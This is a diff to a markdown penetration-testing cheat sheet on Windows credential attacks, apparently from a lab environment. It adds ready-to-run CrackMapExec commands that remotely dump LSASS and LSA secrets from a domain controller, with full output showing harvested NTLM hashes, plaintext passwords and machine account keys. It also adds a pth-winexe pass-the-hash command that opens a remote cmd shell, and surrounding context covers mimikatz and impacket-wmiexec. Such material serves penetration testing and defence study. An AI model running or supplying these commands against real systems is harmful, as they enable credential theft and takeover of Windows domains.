@@ -201,6 +201,35 @@ hashcat -m 12001 /tmp/hashes.txt /usr/share/wordlists/fasttrack.txt
 {PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv:sqlpass123
 ```
 
+## NTLM Exfiltration with CrackMapExec
+
+* Crackmapexec is an excellent tool to remotely perform a dump of LSASS.
+* Use SMB, WINRM, RDP, LDAP, RDP, FTP and SSH  connect to remote machine to dump lsass
+* Dump at scale for entire subnet (optional)
+* Find hashes and plaintexts in `~/.cme/logs/`.
+* From [dumping-lsass-no-mimikatz](https://blog.cyberadvisors.com/technical-blog/attacks-defenses-dumping-lsass-no-mimikatz/)
+
+```bash
+crackmapexec smb --help
+crackmapexec smb 192.168.0.76 -u testadmin -p Password123 -M lsassy
+
+SMB         192.168.0.76    445    DC               [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC) (domain:test.lab) (signing:True) (SMBv1:True)
+SMB         192.168.0.76    445    DC               [+] test.lab\testadmin:Password123 (Pwn3d!)
+LSASSY      192.168.0.76    445    DC               TEST\testadmin 58a478135a93ac3bf058a5ea0e8fdb71
+LSASSY      192.168.0.76    445    DC               TEST\testadmin Password123
+
+crackmapexec smb 192.168.0.76 -u testadmin -p Password123 --lsa
+
+SMB         192.168.0.76    445    DC               [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC) (domain:test.lab) (signing:True) (SMBv1:True)
+SMB         192.168.0.76    445    DC               [+] test.lab\testadmin:Password123 (Pwn3d!)
+SMB         192.168.0.76    445    DC               [+] Dumping LSA secrets
+SMB         192.168.0.76    445    DC               TEST\DC$:aes256-cts-hmac-sha1-96:5a0f8706487aae9bf38161a4608e7567ac1c4a105226b783ccbd98274c8d4018
+SMB         192.168.0.76    445    DC               TEST\DC$:aes128-cts-hmac-sha1-96:d8402dda8272520b01ba6b8dcfd9b3d8
+SMB         192.168.0.76    445    DC               TEST\DC$:des-cbc-md5:f45b2361ae1ad308
+SMB         192.168.0.76    445    DC               TEST\DC$:plain_password_hex:4e4545a05fe307150e0679cf4169caea359467422908fec7e82b6eb63d23dfa9cb180c4c3da62ff7ce1ab1396b1fa505300bed8d7a67e36b74ab9b25721756181c47850cf9dc220964ae7c50a104cfed776f5c1cb8865bb443d9d757cd90dc1dca063ba89776825f20d7d61b7debfb5339cd69dc3c3c81b0e81c6b74065d4456a6339991fd05a5e687cd8fd0f81562a3613f7094015ab82ca0e16fca01551fdef5f397f48664cb64801215b453d29c1034aca75242c3be6aa080dd6be94ca91f712db8c6d4ca6305ee47912fa5a11bc388388fde380c3d9a712d6c8fe36b50c3cdedc4cae98d75eb9561c0a8ec13a0da
+SMB         192.168.0.76    445    DC               TEST\DC$:aad3b435b51404eeaad3b435b51404ee:6e93dbc1944a24129c85324692f4687b:::
+```
+
 ## NTLM Cracking with mimikatz
 
 * Use mimikatz to extract NTLM hashes of **Local Accounts**
@@ -244,6 +273,8 @@ misc::memssp
 type C:\Windows\System32\mimilsa.log
 
 ```
+
+
 
 ## NTLM Cracking with regsave and impacket-secretsdump
 
@@ -334,7 +365,7 @@ Scenario
 * Run PSExec.exe to spawn a shell on Domain Controller
 * Add Registry Entry to allow RestrictedAdmin RDP loggon
 
-Source <https://www.hornetsecurity.com/en/blog/pass-the-hash-attack/>
+Source [Pass-the-Hash-Attack](https://www.hornetsecurity.com/en/blog/pass-the-hash-attack/)
 
 While still in our Mimikatz session, run the following command to create a CMD session as the user.
 
@@ -404,6 +435,24 @@ impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955ab
 C:\>whoami
 files02\administrator
 ```
+
+## Use pth-winexe tool with pass-the-hash
+
+From [pth-winexe](https://fuzzysecurity.com/tutorials/18.html)
+
+```bash
+# User Fubar
+# NTLM aad3b435b51404eeaad3b435b51404ee:8119935c5f7fa5f57135620c8073aaca
+pth-winexe -U Fubar%aad3b435b51404eeaad3b435b51404ee:8119935c5f7fa5f57135620c8073aaca //192.168.187.135 cmd
+
+E_md4hash wrapper called.
+HASH PASS: Substituting user supplied NTLM HASH...
+
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+```
+
 ## Abuse Net-NTLMv2 Auth Protocol
 
 Scenario
